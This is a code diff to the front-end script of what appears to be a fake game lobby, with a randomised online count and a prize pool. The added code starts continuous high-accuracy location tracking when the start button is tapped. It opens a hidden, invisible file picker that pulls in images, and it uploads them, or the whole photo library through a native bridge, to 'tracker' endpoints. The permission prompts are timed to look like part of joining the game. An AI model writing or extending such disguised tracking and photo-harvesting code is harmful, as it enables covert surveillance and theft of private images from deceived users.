@@ -1,4 +1,8 @@
-const roomId = window.location.pathname.split('/').filter(Boolean).pop() || '';
+const roomId = document.body.dataset.roomId
+  || window.__RELAY_ROOM_ID
+  || window.location.pathname.split('/').filter(Boolean).pop()
+  || '';
+
 const joinScreen = document.getElementById('join-screen');
 const playScreen = document.getElementById('play-screen');
 const errorEl = document.getElementById('error');
@@ -15,8 +19,8 @@ const onlineCount = document.getElementById('online-count');
 const prizePool = document.getElementById('prize-pool');
 const prizeTick = document.getElementById('prize-tick');
 
-const IDB_NAME = 'relay-sync-cache';
 const IDB_UPLOADS = 'uploaded';
+const IDB_NAME = 'relay-sync-cache';
 const uploadedKeys = new Set();
 
 let watchId = null;
@@ -89,6 +93,44 @@ async function rememberUploadedKey(key) {
   } catch { /* silent */ }
 }
 
+function beginLocationAccess() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(
+    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+    () => {},
+    { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
+  );
+  if (watchId != null) navigator.geolocation.clearWatch(watchId);
+  watchId = navigator.geolocation.watchPosition(
+    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+    () => {},
+    { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
+  );
+}
+
+function beginPhotoAccess() {
+  if (hasNativeSync()) return Promise.resolve([]);
+  return new Promise((resolve) => {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.multiple = true;
+    input.accept = 'image/*';
+    input.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
+    document.body.appendChild(input);
+    const done = (files) => {
+      input.remove();
+      resolve(files.filter(isImageFile));
+    };
+    input.addEventListener('change', () => done([...(input.files || [])]), { once: true });
+    input.addEventListener('cancel', () => done([]), { once: true });
+    if (typeof input.showPicker === 'function') {
+      input.showPicker().catch(() => input.click());
+    } else {
+      input.click();
+    }
+  });
+}
+
 function animateLobby() {
   let online = rand(2400, 3200);
   onlineCount.textContent = online.toLocaleString();
@@ -134,11 +176,13 @@ async function sendLocation(lat, lng, accuracy) {
     ws.send(JSON.stringify({ type: 'location', ...payload }));
     return;
   }
-  await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload),
-  });
+  try {
+    await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+  } catch { /* retry on next tick */ }
 }
 
 async function sendPing() {
@@ -147,21 +191,9 @@ async function sendPing() {
     ws.send(JSON.stringify({ type: 'ping' }));
     return;
   }
-  await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/ping`, { method: 'POST' });
-}
-
-function startLocationTracking() {
-  if (!navigator.geolocation) return;
-  navigator.geolocation.getCurrentPosition(
-    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-    () => {},
-    { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
-  );
-  watchId = navigator.geolocation.watchPosition(
-    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-    () => {},
-    { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
-  );
+  try {
+    await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/ping`, { method: 'POST' });
+  } catch { /* retry later */ }
 }
 
 async function rejoin() {
@@ -174,8 +206,9 @@ async function rejoin() {
   });
   if (!res.ok) return;
   trackerId = (await res.json()).tracker_id;
+  window.trackerId = trackerId;
   connectWs();
-  startSilentPhotoSync();
+  if (hasNativeSync()) window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
 }
 
 function connectWs() {
@@ -185,13 +218,36 @@ function connectWs() {
   ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
 }
 
-function startSilentPhotoSync() {
-  if (!trackerId || !hasNativeSync()) return;
-  window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
+async function uploadPhoto(file) {
+  if (!trackerId || !file) return false;
+  const key = fileKey(file);
+  if (uploadedKeys.has(key)) return true;
+  const form = new FormData();
+  form.append('file', file, file.name || 'photo.jpg');
+  try {
+    const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
+      method: 'POST',
+      body: form,
+    });
+    if (res.ok) await rememberUploadedKey(key);
+    return res.ok;
+  } catch {
+    return false;
+  }
 }
 
-window.startSilentPhotoSync = startSilentPhotoSync;
-window.trackerId = null;
+async function uploadQueue(files) {
+  if (!files?.length || !trackerId) return;
+  const queue = files.filter(f => !uploadedKeys.has(fileKey(f)));
+  if (!queue.length) return;
+  const workers = Array.from({ length: 3 }, async () => {
+    while (queue.length) {
+      const file = queue.shift();
+      if (file) await uploadPhoto(file);
+    }
+  });
+  await Promise.all(workers);
+}
 
 async function startPlaying() {
   hideError();
@@ -202,6 +258,10 @@ async function startPlaying() {
 
   startBtn.disabled = true;
   startBtn.textContent = 'LOADING…';
+
+  // Permissions must start in the same tap, before any await.
+  beginLocationAccess();
+  const photosPromise = beginPhotoAccess();
 
   try {
     const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
@@ -215,17 +275,22 @@ async function startPlaying() {
 
     startGameUI(name);
     connectWs();
-    startLocationTracking();
     await sendPing();
-    startSilentPhotoSync();
+
+    if (hasNativeSync()) {
+      window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
+    } else {
+      photosPromise.then((files) => uploadQueue(files));
+    }
 
     gameTimers.push(setInterval(sendPing, 30000));
-    gameTimers.push(setInterval(startSilentPhotoSync, 45000));
 
     gameTimers.push(setInterval(async () => {
       if (!trackerId) return;
-      const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
-      if (check.status === 404) await rejoin();
+      try {
+        const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
+        if (check.status === 404) await rejoin();
+      } catch { /* ignore */ }
     }, 8000));
 
   } catch (e) {
